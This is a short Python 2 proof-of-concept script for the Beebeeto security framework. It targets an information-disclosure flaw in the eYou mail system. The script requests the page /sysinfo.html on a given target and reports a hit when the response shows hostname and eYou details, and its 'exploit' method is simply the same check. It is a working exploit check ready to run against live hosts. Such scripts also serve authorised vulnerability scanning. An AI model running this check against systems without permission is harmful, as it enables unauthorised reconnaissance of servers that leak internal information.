#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0157',
            'name': 'eYou /sysinfo.html 信息泄漏漏洞 POC',
            'author': '大大灰狼',
            'create_date': '2014-11-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'eYou',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['eYou!漏洞', '信息泄露漏洞', '/sysinfo.html', 'php'],
            'desc': 'eYou sysinfo Information Disclosure',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-061538',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        attack_url = args['options']['target'] + '/sysinfo.html'
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url
        request = urllib2.Request(attack_url)
        response = urllib2.urlopen(request)
        content = response.read()
        if 'Hostname:' in content and 'eyou' in content:
            args['success'] = True
            args['poc_ret']['verify_url'] = attack_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())